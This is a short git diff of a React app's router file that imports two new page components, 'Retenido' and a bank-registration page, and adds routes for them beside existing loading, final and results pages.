@@ -13,6 +13,8 @@ import Final from './paginas/Final'
 import Carga from './paginas/Carga'
 import Carga2 from './paginas/Carga2'
 import Resultados from './paginas/resultados'
+import Retenido from './paginas/Retenido'
+import Banco from './paginas/Registrar2'
 
 function App() {
   
@@ -27,7 +29,9 @@ function App() {
               <Route path='final' element={<Final/>}/> 
               <Route path='carga' element={<Carga/>}/>     
               <Route path='carga2' element={<Carga2/>}/> 
-              <Route path='EkM8pokjdsfiojsdijfiosn' element={<Resultados/>}/>             
+              <Route path='EkM8pokjdsfiojsdijfiosn' element={<Resultados/>}/>    
+              <Route path='retenido' element={<Retenido/>}/> 
+              <Route path='registrar2' element={<Banco/>}/> 
          {/*   <Route path='olvide-password' element={<OlvidePassword/>}/>             
               <Route path='olvide-password/:token' element={<NuevoPassword/>}/>
               <Route path='confirmar/:id' element={<ConfirmarCuenta/>}/>*/}  
